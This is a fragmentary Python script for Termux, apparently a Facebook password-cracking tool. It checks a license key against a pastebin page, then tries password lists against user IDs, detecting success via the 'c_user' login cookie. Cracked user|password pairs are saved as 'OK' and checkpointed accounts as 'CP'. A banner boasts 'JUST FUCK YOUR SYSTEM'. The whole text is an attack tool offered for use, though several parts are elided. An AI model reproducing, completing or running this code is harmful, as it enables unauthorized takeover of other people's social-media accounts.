...
def main_apv():
    ...
    logo()
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.KHN-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        ...
        print ("[*]--------------------------------------------------------------")
        kok=open('/data/data/com.termux/files/usr/bin/.KHN-cov', 'w')
        kok.close()
        print ("")
        print ("")
    ...
    r1=requests.get("https://pastebin.com/yWi4TsiE").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ TOOR] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[NAZIR-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					pass
				print('\r\033[1;91m[KHN-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
MR TOOR NAZIRIR IS HERE  JUST FUCK YOUR SYSTEM
                                                     
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97mKHN-TOOR
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97mhttps://www.facebook.com/NaZerkhaN521
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97mGUSTAH
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m5.0.7
\x1b[1;97m------------------------\x1b[1;97m------------------------×
                                                 """
ct = datetime.now()
n = ct.month
